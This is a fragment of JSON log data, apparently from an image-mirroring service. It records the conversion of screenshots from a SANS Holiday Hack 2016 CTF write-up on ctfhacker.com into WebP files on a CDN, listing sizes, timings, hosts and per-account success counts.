02:30:54","host":"us-033*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"38.5%","sourceSize":"104.3 KB","destSize":"40.2 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/ex.png","sourceStatusCode":200,"destWidth":766,"destHeight":659,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn25@2020_6/2020/09/20/18-30-54-348_a6305d9472b60ab2.webp","sourceBytes":63420,"destBytes":47158,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":990,"convertSpendMs":29,"createdTime":"2020-09-21 02:30:54","host":"us-025*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"74.4%","sourceSize":"61.9 KB","destSize":"46.1 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics.png","sourceStatusCode":200,"destWidth":680,"destHeight":309,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn57@2020_5/2020/09/20/18-30-54-468_199d49829a3160e8.webp","sourceBytes":24425,"destBytes":19058,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":1357,"convertSpendMs":10,"createdTime":"2020-09-21 02:30:54","host":"europe68*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"78%","sourceSize":"23.9 KB","destSize":"18.6 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/instagram_1_x6.jpg","sourceStatusCode":200,"destWidth":1134,"destHeight":516,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn14@2020_4/2020/09/20/18-30-54-571_89239289fbf0bbed.webp","sourceBytes":51044,"destBytes":22162,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":1513,"convertSpendMs":19,"createdTime":"2020-09-21 02:30:54","host":"europe-22*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"43.4%","sourceSize":"49.8 KB","destSize":"21.6 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics3.gif","sourceStatusCode":200,"destWidth":900,"destHeight":500,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn5@2020_4/2020/09/20/18-30-54-940_000bd91952ffbb87.webp","sourceBytes":106932,"destBytes":106212,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":1823,"convertSpendMs":649,"createdTime":"2020-09-21 02:30:54","host":"us-021*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"99.3%","sourceSize":"104.4 KB","destSize":"103.7 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/instagram.jpg","sourceStatusCode":200,"destWidth":1080,"destHeight":933,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn73@2020_6/2020/09/20/18-30-54-693_66556a472ddba0cc.webp","sourceBytes":153610,"destBytes":152964,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":2042,"convertSpendMs":55,"createdTime":"2020-09-21 02:30:54","host":"europe64*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"99.6%","sourceSize":"150 KB","destSize":"149.4 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/final.gif","sourceStatusCode":200,"destWidth":650,"destHeight":402,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn54@2020_4/2020/09/20/18-30-55-575_2b3ef1a3d2e84a68.webp","sourceBytes":428580,"destBytes":152118,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":2370,"convertSpendMs":1270,"createdTime":"2020-09-21 02:30:54","host":"us-005*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"35.5%","sourceSize":"418.5 KB","destSize":"148.6 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/train.gif","sourceStatusCode":200,"destWidth":815,"destHeight":614,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn69@2020_2/2020/09/20/18-30-55-681_38b85a09b51d3338.webp","sourceBytes":184990,"destBytes":152976,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":2576,"convertSpendMs":1408,"createdTime":"2020-09-21 02:30:54","host":"us-001*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"82.7%","sourceSize":"180.7 KB","destSize":"149.4 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/train2.gif","sourceStatusCode":200,"destWidth":815,"destHeight":614,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn29@2020_5/2020/09/20/18-30-57-233_0551813dc18bb94f.webp","sourceBytes":90604,"destBytes":78038,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":4034,"convertSpendMs":2926,"createdTime":"2020-09-21 02:30:54","host":"us-013*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"86.1%","sourceSize":"88.5 KB","destSize":"76.2 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/train3.gif","sourceStatusCode":200,"destWidth":815,"destHeight":614,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn45@2020_3/2020/09/20/18-30-57-209_c594d665592a322d.webp","sourceBytes":341355,"destBytes":341532,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":4097,"convertSpendMs":2913,"createdTime":"2020-09-21 02:30:54","host":"us-029*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"100.1%","sourceSize":"333.4 KB","destSize":"333.5 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/genymotion-proxy.gif","sourceStatusCode":200,"destWidth":502,"destHeight":842,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn1@2020_6/2020/09/20/18-30-57-192_4e111644e7552b78.webp","sourceBytes":420619,"destBytes":284952,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":4099,"convertSpendMs":2895,"createdTime":"2020-09-21 02:30:54","host":"us-033*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"67.7%","sourceSize":"410.8 KB","destSize":"278.3 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/audacity.gif","sourceStatusCode":200,"destWidth":1000,"destHeight":500,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn62@2020_4/2020/09/20/18-30-58-347_bc2373d87706457e.webp","sourceBytes":188905,"destBytes":190248,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":5098,"convertSpendMs":4004,"createdTime":"2020-09-21 02:30:54","host":"us-025*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"100.7%","sourceSize":"184.5 KB","destSize":"185.8 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/binja-dungeon.gif","sourceStatusCode":200,"destWidth":1600,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn34@2020_6/2020/09/20/18-30-58-546_fd1d8b09cd005d9c.webp","sourceBytes":218744,"destBytes":243682,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":5416,"convertSpendMs":4267,"createdTime":"2020-09-21 02:30:54","host":"us-001*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"111.4%","sourceSize":"213.6 KB","destSize":"238 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/charles.gif","sourceStatusCode":200,"destWidth":1600,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn90@2020_5/2020/09/20/18-30-59-846_93358ac78e3dfd47.webp","sourceBytes":153611,"destBytes":149516,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":6753,"convertSpendMs":5553,"createdTime":"2020-09-21 02:30:54","host":"us-005*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"97.3%","sourceSize":"150 KB","destSize":"146 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/bonus1.gif","sourceStatusCode":200,"destWidth":1600,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn38@2020_6/2020/09/20/18-31-01-301_298878aa23f30ad4.webp","sourceBytes":445303,"destBytes":357378,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":8795,"convertSpendMs":6488,"createdTime":"2020-09-21 02:30:54","host":"europe64*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"80.3%","sourceSize":"434.9 KB","destSize":"349 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics5.gif","sourceStatusCode":200,"destWidth":900,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn17@2020_4/2020/09/20/18-31-02-666_c19011146b53b81b.webp","sourceBytes":317358,"destBytes":389456,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":10334,"convertSpendMs":7937,"createdTime":"2020-09-21 02:30:54","host":"europe-60*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"122.7%","sourceSize":"309.9 KB","destSize":"380.3 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics4.gif","sourceStatusCode":200,"destWidth":900,"destHeight":800,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn22@2020_5/2020/09/20/18-31-05-112_05aef2611a68544c.webp","sourceBytes":222876,"destBytes":244584,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":12112,"convertSpendMs":10909,"createdTime":"2020-09-21 02:30:54","host":"us-037*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"109.7%","sourceSize":"217.7 KB","destSize":"238.9 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics2.gif","sourceStatusCode":200,"destWidth":900,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn9@2020_5/2020/09/20/18-31-07-036_1619e9638732d40a.webp","sourceBytes":216607,"destBytes":299228,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":13936,"convertSpendMs":12506,"createdTime":"2020-09-21 02:30:54","host":"us-009*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"138.1%","sourceSize":"211.5 KB","destSize":"292.2 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics1.gif","sourceStatusCode":200,"destWidth":900,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn62@2020_1/2020/09/20/18-31-14-075_4b5da8dfafb599a5.webp","sourceBytes":349110,"destBytes":503978,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":21069,"convertSpendMs":19792,"createdTime":"2020-09-21 02:30:54","host":"us-032*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"144.4%","sourceSize":"340.9 KB","destSize":"492.2 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics6.gif","sourceStatusCode":200,"destWidth":1100,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn86@2020_6/2020/09/20/18-31-14-534_f826f9742f502990.webp","sourceBytes":1827065,"destBytes":2609396,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":21945,"convertSpendMs":20177,"createdTime":"2020-09-21 02:30:54","host":"us-017*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"142.8%","sourceSize":"1.7 MB","destSize":"2.5 MB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/genymotion-charles.gif","sourceStatusCode":200,"destWidth":1600,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn93@2020_1/2020/09/20/18-31-16-468_a0897207c8c76355.webp","sourceBytes":1124886,"destBytes":728368,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":24476,"convertSpendMs":21560,"createdTime":"2020-09-21 02:30:54","host":"europe68*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"64.8%","sourceSize":"1.1 MB","destSize":"711.3 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/dungeon1.gif","sourceStatusCode":200,"destWidth":1600,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn66@2020_2/2020/09/20/18-32-24-231_265fb66e5c63244d.webp","sourceBytes":418503,"destBytes":367758,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":29887,"convertSpendMs":28500,"createdTime":"2020-09-21 02:31:55","host":"us-033*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"87.9%","sourceSize":"408.7 KB","destSize":"359.1 KB"}],"successGithubMap":{"myreaderx8":1,"myreaderx15":1,"myreaderx7":1,"myreaderx16":1,"myreaderx6":1,"myreaderx32":1,"myreaderx4":1,"myreaderx10":1,"myreaderx33":1,"myreaderx11":1,"myreaderx3":1,"myreaderx12":1,"myreaderx2":1,"myreaderx13":1,"myreaderx1":1,"myreaderx30":1,"myreaderx31":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx22":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":1}}